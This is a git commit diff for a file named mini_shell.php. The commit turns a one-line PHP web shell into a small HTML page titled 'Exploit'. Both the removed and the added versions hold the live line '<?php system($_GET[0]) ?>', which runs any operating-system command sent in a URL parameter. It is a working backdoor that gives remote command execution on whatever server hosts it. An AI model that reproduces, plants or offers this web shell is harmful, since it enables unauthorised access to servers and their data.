bc13aa02d342db2f1035dca7e2d56dc20cc4238b
code016hiro <107974207+Code002016@users.noreply.github.com>
2025-03-21 16:15:16 +0700

    Update mini_shell.php

--- mini_shell.php
+++ mini_shell.php
@@ -1,1 +1,15 @@
-<?php system($_GET[0]) ?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Exploit</title>
+</head>
+<body>
+    <h1>mini shell</h1>
+    <?php system($_GET[0]) ?>
+</body>
+</html>
+
+
+
